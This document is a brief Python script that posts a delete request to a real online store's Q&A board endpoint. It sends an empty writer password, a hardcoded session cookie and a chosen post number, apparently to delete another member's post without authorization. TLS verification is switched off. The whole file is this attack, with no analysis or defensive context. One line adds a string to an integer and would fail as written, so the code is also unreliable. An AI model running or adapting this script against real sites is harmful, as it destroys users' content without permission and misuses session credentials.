import requests, json, urllib3

urllib3.disable_warnings()

URL = 'https://store.baemin.com/board/board_ps.php'

sno = 1500

headers = {
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36',
    'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
    'Origin': 'https://store.baemin.com',
    'Cookie':
    'GD5SESSID=rfrlor4qi0danl6k97ijb63te2ir74rrdnj4dr6j0uk0p4v4qt64ih07rcaio88ueu3veofjt6htvbbdme17prgid7c53t7tcmef6r3',
    'Referer': 'https://store.baemin.com/board/view.php?noheader=y&memNo=15341&bdId=qa&sno='+sno
}

payload = {
    'mode': 'delete', 
    'sno': sno,
    'bdId': 'qa',
    'writerPw':''
}
res = requests.post(URL, headers = headers, data = payload, verify=False)
print(res.text)